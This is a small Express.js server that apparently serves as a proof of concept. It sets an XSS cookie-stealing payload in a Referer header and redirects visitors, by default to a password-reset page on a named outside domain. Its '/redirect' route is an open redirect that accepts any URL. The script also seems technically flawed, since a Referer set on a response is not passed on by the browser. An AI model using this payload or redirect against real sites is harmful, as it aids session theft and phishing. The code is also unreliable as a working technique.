const express = require('express');
const app = express();

app.get('/redirect', (req, res) => {
    const targetUrl = req.query.url || 'https://mail.invoice.fpt.work/forget-password'; // Default URL if none is provided
    const refererHeader = `any.com?hl="()&%<zzz><ScRiPt>alert(document.cookie)</ScRiPt>`;
    
    res.set('Referer', refererHeader); // Set the Referer header
    res.redirect(targetUrl); // Redirect to the target URL
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
